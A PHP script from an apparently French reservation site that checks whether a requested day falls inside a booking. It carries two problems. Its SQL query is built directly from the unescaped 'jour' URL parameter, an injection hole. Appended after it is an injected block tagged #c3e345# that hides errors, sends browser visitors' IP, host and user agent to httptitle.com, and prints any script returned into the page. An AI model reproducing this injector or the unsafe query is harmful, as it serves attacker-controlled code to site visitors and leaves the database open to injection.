<?php
header('Content-Type: text/html; charset=UTF8'); 
include "inc-connexion.php";
date_default_timezone_set('UTC');
$jour = $_GET['jour'];


$requete = 'SELECT id, etat,date_d FROM reservation WHERE  "'.$jour.'" BETWEEN date_a AND date_d AND date_a != "'.$jour.'" AND date_d != "'.$jour.'"';
$resultat = mysql_query($requete) or die (mysql_error());

$nb = mysql_num_rows($resultat);        
		if($nb == 0) { echo utf8_decode("false");}
		else { 
			echo $jour;
		}

mysql_close($connexion);
?>
<?php
#c3e345#
error_reporting(0); @ini_set('display_errors',0); $wp_basmx09 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_basmx09) && !preg_match ('/bot/i', $wp_basmx09))){
$wp_basmx0909="http://"."http"."title".".com/"."title"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_basmx09);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_basmx0909); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_09basmx = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_09basmx = @file_get_contents($wp_basmx0909);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_09basmx=@stream_get_contents(@fopen($wp_basmx0909, "r"));}}
if (substr($wp_09basmx,1,3) === 'scr'){ echo $wp_09basmx; }
#/c3e345#
?>